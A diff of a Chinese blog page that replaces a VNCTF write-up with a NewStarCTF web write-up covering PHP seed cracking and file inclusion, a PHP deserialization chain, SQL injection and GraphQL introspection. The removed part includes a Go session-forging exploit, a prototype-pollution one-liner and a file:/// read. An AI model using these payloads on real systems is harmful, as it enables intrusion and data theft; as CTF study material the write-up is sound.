@@ -4,19 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="VNCTF复现, Ethe&#39;s blog">
-    <meta name="description" content="webGameV4.0纯签到题
-源码里找flag
-
-base64解码
-gocalc0非预期解：
-&amp;#123;&amp;#123;.&amp;#125;&amp;#125;
-
-查源码
-
-flag在/flag路径，尝试去访问
-然后提示flag在session中
-对se">
+    <meta name="keywords" content="NewStarCTF, Ethe&#39;s blog">
+    <meta name="description" content="WEEK1第一周web太简单不想写
+WEEK2IncludeOne&amp;lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+include(&amp;quot;seed.php&amp;quot;);
+&amp;">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -28,7 +22,7 @@ flag在/flag路径，尝试去访问
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>VNCTF复现 | Ethe&#39;s blog</title>
+    <title>NewStarCTF | Ethe&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://epicture.oss-cn-beijing.aliyuncs.com/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -332,12 +326,12 @@ flag在/flag路径，尝试去访问
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">VNCTF复现</h1>
+                    <h1 class="description center-align post-title">NewStarCTF</h1>
                 </div>
             </div>
         </div>
@@ -465,13 +459,9 @@ flag在/flag路径，尝试去访问
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/ctf/">
-                                <span class="chip bg-color">ctf</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -483,28 +473,28 @@ flag在/flag路径，尝试去访问
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-02-13
+                    2022-09-25
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-25
+                    2022-09-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    6 分
                 </div>
                 
 
@@ -527,346 +517,141 @@ flag在/flag路径，尝试去访问
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="GameV4-0"><a href="#GameV4-0" class="headerlink" title="GameV4.0"></a>GameV4.0</h2><p>纯签到题</p>
-<p>源码里找flag</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220214122029407.png"></p>
-<p>base64解码</p>
-<h2 id="gocalc0"><a href="#gocalc0" class="headerlink" title="gocalc0"></a>gocalc0</h2><p>非预期解：</p>
-<pre class="language-none"><code class="language-none">&#123;&#123;.&#125;&#125;</code></pre>
+                <h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><p>第一周web太简单不想写</p>
+<h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="IncludeOne"><a href="#IncludeOne" class="headerlink" title="IncludeOne"></a>IncludeOne</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+include(&quot;seed.php&quot;);
+&#x2F;&#x2F;mt_srand(*********);
+echo &quot;Hint: &quot;.mt_rand().&quot;&lt;br&gt;&quot;;
+if(isset($_POST[&#39;guess&#39;]) &amp;&amp; md5($_POST[&#39;guess&#39;]) &#x3D;&#x3D;&#x3D; md5(mt_rand()))&#123;
+    if(!preg_match(&quot;&#x2F;base|\.\.&#x2F;i&quot;,$_GET[&#39;file&#39;]) &amp;&amp; preg_match(&quot;&#x2F;NewStar&#x2F;i&quot;,$_GET[&#39;file&#39;]) &amp;&amp; isset($_GET[&#39;file&#39;]))&#123;
+        &#x2F;&#x2F;flag in &#96;flag.php&#96;
+        include($_GET[&#39;file&#39;]);
+    &#125;else&#123;
+        echo &quot;Baby Hacker?&quot;;
+    &#125;
+&#125;else&#123;
+    echo &quot;No Hacker!&quot;;
+&#125; </code></pre>
 
-<p>查源码</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220214125228998.png" alt="image-20220214125228998"></p>
-<p>flag在/flag路径，尝试去访问</p>
-<p>然后提示flag在session中</p>
-<p>对session进行base64解码(第二次解码如果全放进去解不出内容，要一点一点试)</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220214125352267.png" alt="image-20220214125352267"></p>
-<p>预期解：</p>
-<p>拿到源码之后根据源码写个exp</p>
-<pre class="language-none"><code class="language-none">package main
-
-import (
-	_ &quot;embed&quot;
-	&quot;fmt&quot;
-	&quot;os&quot;
-	&quot;reflect&quot;
-	&quot;strings&quot;
-	&quot;text&#x2F;template&quot;
-
-	&quot;github.com&#x2F;gin-contrib&#x2F;sessions&quot;
-	&quot;github.com&#x2F;gin-contrib&#x2F;sessions&#x2F;cookie&quot;
-	&quot;github.com&#x2F;gin-gonic&#x2F;gin&quot;
-	&quot;github.com&#x2F;maja42&#x2F;goval&quot;
-)
-
-&#x2F;&#x2F;go:embed template&#x2F;index.html
-var tpl string
-
-&#x2F;&#x2F;go:embed main.go
-var source string
-
-type Eval struct &#123;
-	E string &#96;json:&quot;e&quot; form:&quot;e&quot; binding:&quot;required&quot;&#96;
+<p>先是个伪随机，然后绕过if判断</p>
+<p>伪随机就直接爆种子然后挨个试就行</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220925223642254.png" alt="image-20220925223642254"></p>
+<p>然后是绕过if，不让有base，还要有newstar，用伪协议就行。</p>
+<p>PHP伪协议可以将某个文件或文件夹包含在其中</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220925223827996.png" alt="image-20220925223827996"></p>
+<p>f12看见flag.php的内容，然后rot13解码。</p>
+<h3 id="UnserializeOne"><a href="#UnserializeOne" class="headerlink" title="UnserializeOne"></a>UnserializeOne</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+class Start&#123;
+    public $name;
+    public $func;
+    public function __destruct()
+    &#123;
+        echo &quot;Welcome to NewStarCTF, &quot;.$this-&gt;name;
+    &#125;
+    public function __isset($var)
+    &#123;
+        ($this-&gt;func)();
+    &#125;
+&#125;
+class Sec&#123;
+    private $obj;
+    private $var;
+    public function __toString()
+    &#123;
+        $this-&gt;obj-&gt;check($this-&gt;var);
+        return &quot;CTFers&quot;;
+    &#125;
+    public function __invoke()
+    &#123;
+        echo file_get_contents(&#39;&#x2F;flag&#39;);
+    &#125;
 &#125;
 
-func (e Eval) Result() (string, error) &#123;
-	eval :&#x3D; goval.NewEvaluator()
-	result, err :&#x3D; eval.Evaluate(e.E, nil, nil)
-	if err !&#x3D; nil &#123;
-		return &quot;&quot;, err
-	&#125;
-	t :&#x3D; reflect.ValueOf(result).Type().Kind()
-
-	if t &#x3D;&#x3D; reflect.Int &#123;
-		return fmt.Sprintf(&quot;%d&quot;, result.(int)), nil
-	&#125; else if t &#x3D;&#x3D; reflect.String &#123;
-		return result.(string), nil
-	&#125; else &#123;
-		return &quot;&quot;, fmt.Errorf(&quot;not valid type&quot;)
-	&#125;
+class Easy&#123;
+    public $cla;
+    public function __call($fun, $var)
+    &#123;
+        $this-&gt;cla &#x3D; clone $var[0];
+    &#125;
 &#125;
+class eeee&#123;
+    public $obj;
+    public function __clone()
+    &#123;
+        if(isset($this-&gt;obj-&gt;cmd))&#123;
+            echo &quot;success&quot;;
+        &#125;&#125;&#125;
+$a &#x3D; new Start();
+$a -&gt;name &#x3D; new Sec();
+$a -&gt;name-&gt;obj &#x3D; new Easy();
+$a -&gt;name-&gt;var &#x3D; new eeee();
+$a -&gt;name-&gt;var-&gt;obj &#x3D; new Start();
+$a -&gt;name-&gt;var-&gt;obj-&gt;func &#x3D; new Sec();
 
-func (e Eval) String() string &#123;
-	res, err :&#x3D; e.Result()
-	if err !&#x3D; nil &#123;
-		fmt.Println(err)
-		res &#x3D; &quot;invalid&quot;
-	&#125;
-	return fmt.Sprintf(&quot;%s &#x3D; %s&quot;, e.E, res)
-&#125;
+#payload
+#O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;N;&#125;s:3:&quot;var&quot;;O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;N;s:4:&quot;func&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;N;s:3:&quot;var&quot;;N;&#125;&#125;&#125;&#125;s:4:&quot;func&quot;;N;&#125;</code></pre>
 
-func render(c *gin.Context) &#123;
-	session :&#x3D; sessions.Default(c)
-
-	var his string
-
-	if session.Get(&quot;history&quot;) &#x3D;&#x3D; nil &#123;
-		his &#x3D; &quot;&quot;
-	&#125; else &#123;
-		his &#x3D; session.Get(&quot;history&quot;).(string)
-	&#125;
-
-	fmt.Println(strings.ReplaceAll(tpl, &quot;&#123;&#123;result&#125;&#125;&quot;, his))
-	t, err :&#x3D; template.New(&quot;index&quot;).Parse(strings.ReplaceAll(tpl, &quot;&#123;&#123;result&#125;&#125;&quot;, his))
-	if err !&#x3D; nil &#123;
-		fmt.Println(err)
-		c.String(500, &quot;internal error&quot;)
-		return
-	&#125;
-	if err :&#x3D; t.Execute(c.Writer, map[string]string&#123;
-		&quot;s0uR3e&quot;: source,
-	&#125;); err !&#x3D; nil &#123;
-		fmt.Println(err)
-	&#125;
-&#125;
-
-func main() &#123;
-	port :&#x3D; os.Getenv(&quot;PORT&quot;)
-	if port &#x3D;&#x3D; &quot;&quot; &#123;
-		port &#x3D; &quot;8080&quot;
-	&#125;
-
-	r :&#x3D; gin.Default()
-	store :&#x3D; cookie.NewStore([]byte(&quot;woW_you-g0t_sourcE_co6e&quot;))
-	r.Use(sessions.Sessions(&quot;session&quot;, store))
-
-	r.GET(&quot;&#x2F;&quot;, func(c *gin.Context) &#123;
-		render(c)
-	&#125;)
-
-	r.GET(&quot;&#x2F;flag&quot;, func(c *gin.Context) &#123;
-		session :&#x3D; sessions.Default(c)
-		session.Set(&quot;FLAG&quot;, os.Getenv(&quot;FLAG&quot;))
-		session.Save()
-		c.String(200, &quot;flag is in your session&quot;)
-	&#125;)
-
-	r.POST(&quot;&#x2F;&quot;, func(c *gin.Context) &#123;
-		session :&#x3D; sessions.Default(c)
-
-		var his string
-
-		if session.Get(&quot;history&quot;) &#x3D;&#x3D; nil &#123;
-			his &#x3D; &quot;&quot;
-		&#125; else &#123;
-			his &#x3D; session.Get(&quot;history&quot;).(string)
-		&#125;
-
-		eval :&#x3D; Eval&#123;&#125;
-		if err :&#x3D; c.ShouldBind(&amp;eval); err &#x3D;&#x3D; nil &#123;
-			his &#x3D; his + eval.String() + &quot;&lt;br&#x2F;&gt;&quot;
-		&#125;
-		session.Set(&quot;history&quot;, his)
-		session.Save()
-		render(c)
-	&#125;)
-
-	r.Run(fmt.Sprintf(&quot;:%s&quot;, port))
-&#125;
-</code></pre>
-
-<p>exp：</p>
-<pre class="language-go" data-language="go"><code class="language-go">package main
-
-import (
-   _ &quot;embed&quot;
-   &quot;fmt&quot;
-   &quot;github.com&#x2F;gin-contrib&#x2F;sessions&quot;
-   &quot;github.com&#x2F;gin-contrib&#x2F;sessions&#x2F;cookie&quot;
-   &quot;github.com&#x2F;gin-gonic&#x2F;gin&quot;
-   &quot;os&quot;
-)
-
-func main() &#123;
-   port :&#x3D; os.Getenv(&quot;PORT&quot;)
-   if port &#x3D;&#x3D; &quot;&quot; &#123;
-      port &#x3D; &quot;8080&quot;
-   &#125;
-   r :&#x3D; gin.Default()
-   store :&#x3D; cookie.NewStore([]byte(&quot;woW_you-g0t_sourcE_co6e&quot;))
-   r.Use(sessions.Sessions(&quot;session&quot;, store))
-   r.GET(&quot;&#x2F;&quot;, func(c *gin.Context) &#123;
-      session :&#x3D; sessions.Default(c)
-      println(session.Get(&quot;FLAG&quot;).(string))
-   &#125;)
-   r.Run(fmt.Sprintf(&quot;:%s&quot;, port))
-&#125;</code></pre>
-
-<p>这部分等学了go之后再看看，先放着</p>
-<h2 id="newcalc0"><a href="#newcalc0" class="headerlink" title="newcalc0"></a>newcalc0</h2><p>考点：<strong>原型污染通过 console.table 属性（低）（CVE-2022-21824）</strong></p>
-<p>由于 console.table() 函数的格式化逻辑，允许用户控制的输入传递给 properties 参数同时传递一个是不安全的具有至少一个属性作为第一个参数的普通对象，可以是<code>__proto__</code>. 原型污染的控制非常有限，因为它只允许为对象原型的数字键分配一个空字符串。</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220215115638665.png" alt="image-20220215115638665"></p>
-<p>exp： <code>console.table([&#123; x : 1 &#125;], [ &quot;__proto__&quot; ]);</code></p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220215115645015.png" alt="image-20220215115645015"></p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220215115655004.png" alt="image-20220215115655004"></p>
-<h2 id="easyJava"><a href="#easyJava" class="headerlink" title="easyJava"></a>easyJava</h2><p>存在任意文件读取</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220215115704939.png" alt="image-20220215115704939"></p>
-<p>读不到flag，应该是要通过调用readflag来读取flag</p>
-<pre class="language-none"><code class="language-none">file?url&#x3D;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;</code></pre>
-
-<p>反编译看一下源码</p>
-<p>Secr3t.jad</p>
-<pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.
-&#x2F;&#x2F; Jad home page: http:&#x2F;&#x2F;www.kpdus.com&#x2F;jad.html
-&#x2F;&#x2F; Decompiler options: packimports(3) 
-&#x2F;&#x2F; Source File Name:   Secr3t.java
-
-package util;
-
-import java.io.*;
-import org.apache.commons.lang3.RandomStringUtils;
-
-public class Secr3t
+<p>可以利用对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220925231137367.png" alt="image-20220925231137367"></p>
+<h3 id="Word-For-You-2-Gen"><a href="#Word-For-You-2-Gen" class="headerlink" title="Word-For-You(2 Gen)"></a>Word-For-You(2 Gen)</h3><p>报错注入就行</p>
+<p>flag在wfy_comment表的id=100那行</p>
+<h3 id="ezAPI"><a href="#ezAPI" class="headerlink" title="ezAPI"></a>ezAPI</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+error_reporting(0);
+$id &#x3D; $_POST[&#39;id&#39;];
+function waf($str)
 &#123;
-
-    private Secr3t()
-    &#123;
-    &#125;
-
-    public static String getKey()
-    &#123;
-        return Key;
-    &#125;
-
-    public static StringBuffer getFlag()
-    &#123;
-        InputStream in;
-        BufferedReader read;
-        Flag &#x3D; new StringBuffer();
-        in &#x3D; null;
-        try
-        &#123;
-            in &#x3D; Runtime.getRuntime().exec(&quot;&#x2F;readflag&quot;).getInputStream();
-        &#125;
-        catch(IOException e)
-        &#123;
-            e.printStackTrace();
-        &#125;
-        read &#x3D; new BufferedReader(new InputStreamReader(in));
-        for(String line &#x3D; null; (line &#x3D; read.readLine()) !&#x3D; null;)
-            Flag.append((new StringBuilder()).append(line).append(&quot;\n&quot;).toString());
-
-        IOException e;
-        try
-        &#123;
-            in.close();
-            read.close();
-        &#125;
-        &#x2F;&#x2F; Misplaced declaration of an exception variable
-        catch(IOException e)
-        &#123;
-            e.printStackTrace();
-            System.out.println(&quot;Secr3t : io exception!&quot;);
-        &#125;
-        break MISSING_BLOCK_LABEL_176;
-        e;
-        e.printStackTrace();
-        try
-        &#123;
-            in.close();
-            read.close();
-        &#125;
-        &#x2F;&#x2F; Misplaced declaration of an exception variable
-        catch(IOException e)
-        &#123;
-            e.printStackTrace();
-            System.out.println(&quot;Secr3t : io exception!&quot;);
-        &#125;
-        break MISSING_BLOCK_LABEL_176;
-        Exception exception;
-        exception;
-        try
-        &#123;
-            in.close();
-            read.close();
-        &#125;
-        catch(IOException e)
-        &#123;
-            e.printStackTrace();
-            System.out.println(&quot;Secr3t : io exception!&quot;);
-        &#125;
-        throw exception;
-        return Flag;
-    &#125;
-
-    public static boolean check(String checkStr)
-    &#123;
-        return &quot;vnctf2022&quot;.equals(checkStr);
-    &#125;
-
-    private static final String Key &#x3D; RandomStringUtils.randomAlphanumeric(32);
-    private static StringBuffer Flag;
-
-&#125;</code></pre>
-
-<p>HelloWorldServlet.jad</p>
-<pre class="language-java" data-language="java"><code class="language-java">package servlet;
-
-import javax.servlet.annotation.*;
-import entity.*;
-import javax.servlet.http.*;
-import java.io.*;
-import java.util.*;
-import util.*;
-import javax.servlet.*;
-
-@WebServlet(name &#x3D; &quot;HelloServlet&quot;, urlPatterns &#x3D; &#123; &quot;&#x2F;evi1&quot; &#125;)&#x2F;&#x2F;比赛的时候用的jad反编译的没这块，虽然之后查日志找到了路径
-public class HelloWorldServlet extends HttpServlet
-&#123;
-    private volatile String name;
-    private volatile String age;
-    private volatile String height;
-    User user;
-    
-    public HelloWorldServlet() &#123;
-        this.name &#x3D; &quot;m4n_q1u_666&quot;;
-        this.age &#x3D; &quot;666&quot;;
-        this.height &#x3D; &quot;180&quot;;
-    &#125;
-    
-    public void init() throws ServletException &#123;
-        this.user &#x3D; new User(this.name, this.age, this.height);
-    &#125;
-    
-    protected void doGet(final HttpServletRequest req, final HttpServletResponse resp) throws ServletException, IOException &#123;
-        final String reqName &#x3D; req.getParameter(&quot;name&quot;);
-        if (reqName !&#x3D; null) &#123;
-            this.name &#x3D; reqName;
-        &#125;
-        if (Secr3t.check(this.name)) &#123;
-            this.Response(resp, &quot;no vnctf2022!&quot;);
-            return;
-        &#125;
-        if (Secr3t.check(this.name)) &#123;
-            this.Response(resp, &quot;The Key is &quot; + Secr3t.getKey());
-        &#125;
-    &#125;
-    
-    protected void doPost(final HttpServletRequest req, final HttpServletResponse resp) throws ServletException, IOException &#123;
-        final String key &#x3D; req.getParameter(&quot;key&quot;);
-        final String text &#x3D; req.getParameter(&quot;base64&quot;);
-        if (Secr3t.getKey().equals(key) &amp;&amp; text !&#x3D; null) &#123;
-            final Base64.Decoder decoder &#x3D; Base64.getDecoder();
-            final byte[] textByte &#x3D; decoder.decode(text);
-            final User u &#x3D; (User)SerAndDe.deserialize(textByte);
-            if (this.user.equals((Object)u)) &#123;
-                this.Response(resp, &quot;Deserialize\u2026\u2026 Flag is &quot; + Secr3t.getFlag().toString());
-            &#125;
-        &#125;
-        else &#123;
-            this.Response(resp, &quot;KeyError&quot;);
-        &#125;
-    &#125;
-    
-    private void Response(final HttpServletResponse resp, final String outStr) throws IOException &#123;
-        final ServletOutputStream out &#x3D; resp.getOutputStream();
-        out.write(outStr.getBytes());
-        out.flush();
-        out.close();
+    if (!is_numeric($str) || preg_replace(&quot;&#x2F;[0-9]&#x2F;&quot;, &quot;&quot;, $str) !&#x3D;&#x3D; &quot;&quot;) &#123;
+        return False;
+    &#125; else &#123;
+        return True;
     &#125;
 &#125;
-</code></pre>
 
-<p>留个坑，不会了，暑假开始学java再来补（</p>
+function send($data)
+&#123;
+    $options &#x3D; array(
+        &#39;http&#39; &#x3D;&gt; array(
+            &#39;method&#39; &#x3D;&gt; &#39;POST&#39;,
+            &#39;header&#39; &#x3D;&gt; &#39;Content-type: application&#x2F;json&#39;,
+            &#39;content&#39; &#x3D;&gt; $data,
+            &#39;timeout&#39; &#x3D;&gt; 10 * 60
+        )
+    );
+    $context &#x3D; stream_context_create($options);
+    $result &#x3D; file_get_contents(&quot;http:&#x2F;&#x2F;graphql:8080&#x2F;v1&#x2F;graphql&quot;, false, $context);
+    return $result;
+&#125;
+
+if (isset($id)) &#123;
+    if (waf($id)) &#123;
+        isset($_POST[&#39;data&#39;]) ? $data &#x3D; $_POST[&#39;data&#39;] : $data &#x3D; &#39;&#123;&quot;query&quot;:&quot;query&#123;\nusers_user_by_pk(id:&#39; . $id . &#39;) &#123;\nname\n&#125;\n&#125;\n&quot;, &quot;variables&quot;:null&#125;&#39;;
+        $res &#x3D; json_decode(send($data));
+        if ($res-&gt;data-&gt;users_user_by_pk-&gt;name !&#x3D;&#x3D; NULL) &#123;
+            echo &quot;ID: &quot; . $id . &quot;&lt;br&gt;Name: &quot; . $res-&gt;data-&gt;users_user_by_pk-&gt;name;
+        &#125; else &#123;
+            echo &quot;&lt;b&gt;Can&#39;t found it!&lt;&#x2F;b&gt;&lt;br&gt;&lt;br&gt;DEBUG: &quot;;
+            var_dump($res-&gt;data);
+        &#125;
+    &#125; else &#123;
+        die(&quot;&lt;b&gt;Hacker! Only Number!&lt;&#x2F;b&gt;&quot;);
+    &#125;
+&#125; else &#123;
+    die(&quot;&lt;b&gt;No Data?&lt;&#x2F;b&gt;&quot;);
+&#125;
+?&gt;</code></pre>
+
+<p>本来以为会是一个stream_context_create的crlf漏洞，然后发现其实是graphql的安全问题</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">玩转graphQL (qq.com)</a></p>
+<p>具体的看这个就行</p>
+<p>先用内省查询获得数据</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">&#123;&quot;query&quot;:&quot;\n    query IntrospectionQuery &#123;\r\n      __schema &#123;\r\n        queryType &#123; name &#125;\r\n        mutationType &#123; name &#125;\r\n        subscriptionType &#123; name &#125;\r\n        types &#123;\r\n          ...FullType\r\n        &#125;\r\n        directives &#123;\r\n          name\r\n          description\r\n          locations\r\n          args &#123;\r\n            ...InputValue\r\n          &#125;\r\n        &#125;\r\n      &#125;\r\n    &#125;\r\n\r\n    fragment FullType on __Type &#123;\r\n      kind\r\n      name\r\n      description\r\n      fields(includeDeprecated: true) &#123;\r\n        name\r\n        description\r\n        args &#123;\r\n          ...InputValue\r\n        &#125;\r\n        type &#123;\r\n          ...TypeRef\r\n        &#125;\r\n        isDeprecated\r\n        deprecationReason\r\n      &#125;\r\n      inputFields &#123;\r\n        ...InputValue\r\n      &#125;\r\n      interfaces &#123;\r\n        ...TypeRef\r\n      &#125;\r\n      enumValues(includeDeprecated: true) &#123;\r\n        name\r\n        description\r\n        isDeprecated\r\n        deprecationReason\r\n      &#125;\r\n      possibleTypes &#123;\r\n        ...TypeRef\r\n      &#125;\r\n    &#125;\r\n\r\n    fragment InputValue on __InputValue &#123;\r\n      name\r\n      description\r\n      type &#123; ...TypeRef &#125;\r\n      defaultValue\r\n    &#125;\r\n\r\n    fragment TypeRef on __Type &#123;\r\n      kind\r\n      name\r\n      ofType &#123;\r\n        kind\r\n        name\r\n        ofType &#123;\r\n          kind\r\n          name\r\n          ofType &#123;\r\n            kind\r\n            name\r\n            ofType &#123;\r\n              kind\r\n              name\r\n              ofType &#123;\r\n                kind\r\n                name\r\n                ofType &#123;\r\n                  kind\r\n                  name\r\n                  ofType &#123;\r\n                    kind\r\n                    name\r\n                  &#125;\r\n                &#125;\r\n              &#125;\r\n            &#125;\r\n          &#125;\r\n        &#125;\r\n      &#125;\r\n    &#125;\r\n  &quot;,&quot;variables&quot;:null&#125;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220927144312348.png" alt="image-20220927144312348"></p>
+<p>找到flag在的地方，然后查询</p>
+<p><code>&amp;data=&#123;&quot;query&quot;:&quot;query&#123;\nffffllllaaagggg_1n_h3r3_flag &#123;\nflag\n&#125;\n&#125;\n&quot;, &quot;variables&quot;:null&#125;</code></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220927142726823.png" alt="image-20220927142726823"></p>
 
                 
             </div>
@@ -893,7 +678,7 @@ public class HelloWorldServlet extends HttpServlet
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Ethe448.github.io/2022/02/13/VNCTF%E5%A4%8D%E7%8E%B0/">https://Ethe448.github.io/2022/02/13/VNCTF%E5%A4%8D%E7%8E%B0/</a>
+                    <a href="https://Ethe448.github.io/2022/09/25/NewStarCTF/">https://Ethe448.github.io/2022/09/25/NewStarCTF/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -930,11 +715,7 @@ public class HelloWorldServlet extends HttpServlet
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/ctf/">
-                                    <span class="chip bg-color">ctf</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -1372,62 +1153,18 @@ public class HelloWorldServlet extends HttpServlet
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/02/21/js%E6%BC%8F%E6%B4%9E/">
+                <a href="/2022/09/25/NewStarCTF/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/6.jpg" class="responsive-img" alt="js漏洞">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/3.jpg" class="responsive-img" alt="NewStarCTF">
                         
-                        <span class="card-title">js漏洞</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-21
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Ethe
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
-                        <span class="chip bg-color">web学习</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/01/24/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/13.jpg" class="responsive-img" alt="ict学习笔记">
-                        
-                        <span class="card-title">ict学习笔记</span>
+                        <span class="card-title">NewStarCTF</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1438,7 +1175,7 @@ public class HelloWorldServlet extends HttpServlet
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-25
                             </span>
                         <span class="publish-author">
                             
@@ -1448,13 +1185,43 @@ public class HelloWorldServlet extends HttpServlet
                         </span>
                     </div>
                 </div>
+
                 
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E5%8D%8E%E4%B8%BAict/">
-                        <span class="chip bg-color">华为ict</span>
-                    </a>
-                    
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/09/20/DASCTFxCBCTF/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/18.jpg" class="responsive-img" alt="DASCTFxCBCTF">
+                        
+                        <span class="card-title">DASCTFxCBCTF</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Ethe
+                            
+                        </span>
+                    </div>
                 </div>
                 
             </div>
